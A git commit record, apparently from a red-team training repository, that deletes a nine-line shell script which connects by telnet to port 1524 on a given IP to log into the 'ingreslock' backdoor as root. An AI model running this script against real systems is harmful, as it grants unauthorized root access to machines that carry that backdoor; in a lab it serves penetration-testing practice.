719df2385f900139bc830666b4838900cd2558de
CSARedTeam <andr01d@tutanota.com>
2018-02-07 16:57:55 -0600

    Delete ingreslockBackDoorTrigger.sh

--- ingreslockBackDoorTrigger.sh
+++
@@ -1,9 +0,0 @@
-#! /bin/sh
-if [ -z "$1" ]
-      then
-          echo "usage: ingreslockBackDoor.sh 'ip'"
-          exit 1
-fi
-
-echo "Attempting to log into ingreslock back door as root\n"
-telnet $1 1524
